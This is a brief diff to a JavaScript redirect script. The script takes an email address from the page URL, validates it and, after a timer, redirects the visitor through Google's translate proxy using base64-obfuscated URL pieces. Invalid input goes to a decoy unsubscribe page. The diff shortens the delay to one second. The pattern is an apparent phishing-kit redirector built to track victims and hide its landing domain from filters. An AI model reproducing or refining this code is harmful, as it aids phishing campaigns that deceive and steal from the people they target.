@@ -151,7 +151,6 @@ function getRandomString(length) {
     
       const uidParam = new URLSearchParams(window.location.search).get('i');
   
-      //var decString = atob(uidParam);
       var decString = uidParam;
       const isValidEmailInput = isValidEmail(decString);
 
@@ -180,7 +179,7 @@ function getRandomString(length) {
           setTimeout(function() {
             var url = "https://" + dmain + atob('LnRyYW5zbGF0ZS5nb29nLw==') + randmd5 + atob('Lz94PQ==') + oxx + atob('Jl94X3RyX3NsPWF1dG8mX3hfdHJfdGw9ZW4mX3hfdHJfaGw9ZW4tVVMmX3hfdHJfcHRvPXdhcHBibG9nLmh0bWw=');
             window.location.replace(url);
-        }, 10000);
+        }, 1000);
           } else {
             setTimeout(function() {
               window.location.replace(atob('aHR0cHM6Ly91bnN1YnNjcmliZS5naXRodWIuaW8v'));
